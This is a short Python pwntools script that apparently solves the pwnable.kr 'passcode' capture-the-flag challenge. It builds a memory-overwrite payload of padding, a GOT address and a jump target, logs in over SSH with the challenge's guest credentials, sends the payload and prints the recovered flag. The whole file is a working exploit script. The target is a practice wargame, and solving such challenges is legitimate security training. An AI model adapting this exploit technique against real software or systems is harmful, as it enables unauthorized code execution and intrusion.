#!/usr/bin/python3


from pwn import *


# 96 junk bytes + 0x0804a004 + 0x080485e3
payload = b'A' * 96 + b'\x04\xa0\x04\x08' + str(int(0x080485e3)).encode()

# connect to the server
con = ssh(host='pwnable.kr', port=2222, user='passcode', password='guest')
program = con.process(['./passcode'])

program.recvline()

program.sendline(payload)
program.recvline()

flag = program.recvline()
program.recvuntil(': ')
flag += program.recvall()

print('[+] flag = {}'.format(flag.decode()))